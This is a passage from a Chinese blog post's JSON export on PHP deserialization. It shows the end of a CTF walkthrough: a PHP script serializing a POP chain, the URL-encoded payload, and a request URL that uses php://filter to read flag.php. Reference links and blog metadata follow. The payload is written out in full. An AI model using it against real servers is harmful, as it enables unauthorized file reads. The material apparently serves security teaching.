operator\">-></span><span class=\"token property\">page</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Make_a_Change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Try_Work_Hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而后得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A12<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Road_is_Long<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A4<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>page<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A12<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Road_is_Long<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A4<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>page<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A13<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Make_a_Change<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>effort<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A13<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Try_Work_Hard<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>A<span class=\"token operator\">%</span><span class=\"token number\">00</span>var<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A57<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>php<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">2</span>F<span class=\"token operator\">%</span><span class=\"token number\">2</span>Ffilter<span class=\"token operator\">%</span><span class=\"token number\">2</span>Fread<span class=\"token operator\">%</span><span class=\"token number\">3</span>Dconvert<span class=\"token operator\">.</span>base64<span class=\"token operator\">-</span>encode<span class=\"token operator\">%</span><span class=\"token number\">2</span>Fresource<span class=\"token operator\">%</span><span class=\"token number\">3</span>Dflag<span class=\"token operator\">.</span>php<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>给参数赋值再经base64解码即可获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//59.110.159.206:7050/?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://www.quan9i.top/2022/05/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E6%B5%85%E5%AD%A6%E4%B9%A0/\">反序列化之魔术方法的浅学习</a><br><a href=\"http://101.43.172.125/2020/05/22/%E5%8E%9F%E7%90%86%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Csession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\">原理实践学习php反序列化和session反序列化</a><br><a href=\"https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502\">[CTF]PHP反序列化总结</a><br><a href=\"http://mrxiaoqin.top/2022/05/14/ctf%E4%B8%AD%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E7%AF%87%E8%AF%A6%E8%A7%A3/\">CTF中反序列化一篇详解</a><br><a href=\"https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/\">PHP反序列化</a><br><a href=\"https://www.freebuf.com/column/197496.html\">实战经验丨PHP反序列化漏洞总结</a><br><a href=\"https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\">php序列化</a><br><a href=\"https://zhuanlan.zhihu.com/p/90879209\">PHP-Session利用总结</a><br><a href=\"http://101.43.172.125/2020/08/26/%E6%B5%85%E6%9E%90php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/\">浅析PHP反序列化字符串逃逸</a></p>\n","feature":true,"text":"前言反序列化是一个尤为重要的知识点，最近对反序列化进行了简单学习，并总结如下，希望能对正在学习的师傅有所帮助。 前提了解序列化和反序列化学习反序列化之前，首先要知道序列化，简单的举个栗子来说 &lt;?php $a='quan9i'; echo \"----------初始数据--...","link":"","photos":[],"count_time":{"symbolsCount":"44k","symbolsTime":"40 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E6%8F%90\"><span class=\"toc-text\">前提</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%86%E8%A7%A3%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">了解序列化和反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89\"><span class=\"toc-text\">面向对象（部分）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%B1%BB\"><span class=\"toc-text\">类</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">对象</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F\"><span class=\"toc-text\">成员变量</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">成员函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">完整构造过程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89%E7%B1%BB\"><span class=\"toc-text\">定义类</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">创建对象</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">调用成员方法</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">魔术方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#construct-%E4%B8%8E-destruct\"><span class=\"toc-text\">__construct()与__destruct()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sleep\"><span class=\"toc-text\">__sleep()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wakeup\"><span class=\"toc-text\">__wakeup()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#toString-NaN\"><span class=\"toc-text\">__toString()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#invoke\"><span class=\"toc-text\">__invoke()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#get\"><span class=\"toc-text\">__get</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#set\"><span class=\"toc-text\">set</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#call\"><span class=\"toc-text\">__call()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#isset\"><span class=\"toc-text\">isset()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#unset\"><span class=\"toc-text\">__unset()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB%E4%BE%8B%E5%AD%90\"><span class=\"toc-text\">常用魔术函数汇总例子</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%80%83%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">常考类型</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">反序列化字符串逃逸</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">绕过正则函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">利用引用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">session反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POP%E9%93%BE%E6%9E%84%E9%80%A0\"><span class=\"toc-text\">POP链构造</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95%E7%B1%BB%E5%9E%8B%EF%BC%88%E8%AF%BB%E6%87%82%E4%BB%A3%E7%A0%81%EF%BC%89\"><span class=\"toc-text\">简单类型（读懂代码）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">字符串逃逸</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%A4%9A%EF%BC%89\"><span class=\"toc-text\">0X01（字符串增多）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%B0%91%EF%BC%89\"><span class=\"toc-text\">0X02（字符串变少）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99\"><span class=\"toc-text\">绕过正则</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8-1\"><span class=\"toc-text\">利用引用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1\"><span class=\"toc-text\">session反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POP%E9%93%BE%E6%9E%84%E9%80%A0-1\"><span class=\"toc-text\">POP链构造</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"浅析文件包含","uid":"778d53d2750c08bc5c3164d03f2d66cf","slug":"浅析文件包含","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:55:42.000Z","comments":true,"path":"api/articles/浅析文件包含.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141555978.png","text":"前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行学习，并总结如下，希望能对正在学习文件包含的人有些许帮助。 漏洞相关信息漏洞成因后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就 被称为文件包含。文件包含的存在使得开发变得更加灵活...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件包含","slug":"文件包含","count":1,"path":"api/tags/文件包含.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"从SQL注入绕过最新安全狗WAF中学习fuzz","uid":"c4af92d3966b8512b6eb5994e52b620f","slug":"从SQL注入绕过最新安全狗WAF中学习fuzz","date":"2022-06-08T09:35:30.000Z","updated":"2024-02-14T07:42:42.000Z","comments":true,"path":"api/articles/从SQL注入绕过最新安全狗WAF中学习fuzz.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141515509.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11412 前言SQL注入并不是很精通，通过实战绕过WAF来进行加强SQL注入能力，希望对正在学习的师傅能有一丝帮助。 安装安装前言我是本地搭建的环境进行测试的环境是windows11+phpstudy2018...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"绕WAF","slug":"绕WAF","count":1,"path":"api/categories/绕WAF.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":2,"path":"api/tags/SQL注入.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}